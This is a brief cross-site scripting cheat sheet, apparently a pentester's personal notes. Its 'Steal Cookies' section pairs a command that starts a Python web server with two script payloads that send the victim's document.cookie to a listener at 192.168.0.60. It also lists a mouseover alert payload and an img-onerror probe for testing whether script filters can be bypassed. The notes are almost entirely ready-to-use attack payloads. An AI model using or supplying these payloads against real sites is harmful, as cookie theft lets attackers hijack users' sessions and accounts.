Steal Cookies
-----------------------
```
# Use ruby SSL server for SSL connections
# Start Python Web Server
python -m SimpleHTTPServer 80

<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
```
Mouseover test
-----------------------
```javascript
<a href="" onmouseover="javascript:alert('HackerOne MkSecurity Dom XSS');">Click for Detail</a>
```

Use to test if script "<script>alert(123)</script>" tags are being blocked
-----------------------
```javascript
ackerokm7x<img src=a onerror=alert(1)>y09fr
```
